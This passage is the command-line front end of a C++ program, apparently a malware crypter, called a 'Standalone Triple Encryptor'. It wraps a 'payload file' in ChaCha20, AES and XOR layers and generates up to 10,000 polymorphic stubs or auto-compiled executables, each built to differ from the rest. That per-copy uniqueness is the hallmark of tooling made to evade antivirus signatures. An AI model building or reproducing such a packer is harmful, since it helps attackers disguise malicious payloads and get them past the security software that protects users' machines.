            keyFile << "ENCRYPTION_ORDER: " << keys.encryptionOrder[0] << " " 
                    << keys.encryptionOrder[1] << " " << keys.encryptionOrder[2] << std::endl;
            keyFile.close();
        }
        
        return true;
    }
};

int main(int argc, char* argv[]) {
    std::cout << "=== Standalone Triple Encryptor (Unlimited) ===" << std::endl;
    std::cout << "Advanced ChaCha20 + AES + XOR with No-Limit Generation" << std::endl;
    std::cout << "Self-Contained • No Dependencies • Unlimited Unique Stubs" << std::endl;
    std::cout << "=================================================" << std::endl;
    
    if (argc < 3) {
        std::cout << "\nUsage:" << std::endl;
        std::cout << "  File Encryption:     " << argv[0] << " -e <input_file> <output_file>" << std::endl;
        std::cout << "  Generate C++ Stub:   " << argv[0] << " -s <payload_file> <stub_base_name>" << std::endl;
        std::cout << "  Generate EXE (Auto): " << argv[0] << " -x <payload_file> <exe_base_name>" << std::endl;
        std::cout << "  Unlimited Mode:      " << argv[0] << " -u <payload_file> <count> [base_name]" << std::endl;
        std::cout << "\nFeatures:" << std::endl;
        std::cout << "  • Unlimited unique stub generation (no limits!)" << std::endl;
        std::cout << "  • Every stub is completely different" << std::endl;
        std::cout << "  • Polymorphic code, variable names, functions" << std::endl;
        std::cout << "  • Auto-compilation to EXE (if compiler available)" << std::endl;
        std::cout << "  • Standalone operation (no VS required)" << std::endl;
        std::cout << "  • Triple-layer encryption with randomized order" << std::endl;
        std::cout << "\nFor auto-compilation:" << std::endl;
        std::cout << "  • Place MinGW-w64 in 'mingw64/' folder, or" << std::endl;
        std::cout << "  • Place TinyCC in 'tcc/' folder, or" << std::endl;
        std::cout << "  • Have g++/cl in system PATH" << std::endl;
        return 1;
    }
    
    StandaloneTripleEncryptor encryptor;
    std::string mode = argv[1];
    
    if (mode == "-e" && argc == 4) {
        std::cout << "\n[*] Encrypting file with triple-layer protection..." << std::endl;
        
        if (encryptor.encryptFile(argv[2], argv[3])) {
            std::cout << "[+] File encrypted successfully!" << std::endl;
            std::cout << "[+] Output: " << argv[3] << std::endl;
            std::cout << "[+] Keys saved: " << argv[3] << ".keys" << std::endl;
        } else {
            std::cerr << "[-] Encryption failed!" << std::endl;
            return 1;
        }
    }
    else if (mode == "-s" && argc == 4) {
        std::cout << "\n[*] Generating unlimited unique C++ stub..." << std::endl;
        
        if (encryptor.generateUnlimitedExecutable(argv[2], argv[3], false)) {
            std::cout << "[+] Unique stub generation complete!" << std::endl;
            std::cout << "[+] Every generation creates a completely different stub" << std::endl;
        } else {
            std::cerr << "[-] Stub generation failed!" << std::endl;
            return 1;
        }
    }
    else if (mode == "-x" && argc == 4) {
        std::cout << "\n[*] Generating unlimited unique executable..." << std::endl;
        
        if (encryptor.generateUnlimitedExecutable(argv[2], argv[3], true)) {
            std::cout << "[+] Unique executable generation complete!" << std::endl;
            std::cout << "[+] Ready to run - completely standalone!" << std::endl;
        } else {
            std::cerr << "[-] Executable generation failed!" << std::endl;
            return 1;
        }
    }
    else if (mode == "-u" && argc >= 4) {
        int count = argc >= 4 ? std::atoi(argv[3]) : 1;
        std::string baseName = argc >= 5 ? argv[4] : "unlimited_stub";
        
        if (count <= 0 || count > 10000) {
            std::cerr << "[-] Count must be between 1 and 10000" << std::endl;
            return 1;
        }
        
        std::cout << "\n[*] Generating " << count << " unlimited unique executables..." << std::endl;
        std::cout << "[*] Each will be completely different from the others!" << std::endl;
        
        int success = 0;
        for (int i = 0; i < count; i++) {
            std::string outputName = baseName + "_" + std::to_string(i + 1);
            
            std::cout << "\r[*] Generating: " << (i + 1) << "/" << count << " (" 
                      << outputName << ")         " << std::flush;
            
            if (encryptor.generateUnlimitedExecutable(argv[2], outputName, true)) {
                success++;
            }
            
            // Small delay to ensure different entropy
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        
        std::cout << "\n[+] Generated " << success << "/" << count << " unique executables!" << std::endl;
        std::cout << "[+] Each executable is cryptographically unique!" << std::endl;
    }
    else {
        std::cerr << "[-] Invalid command line arguments!" << std::endl;
        return 1;
    }
    
    return 0;
}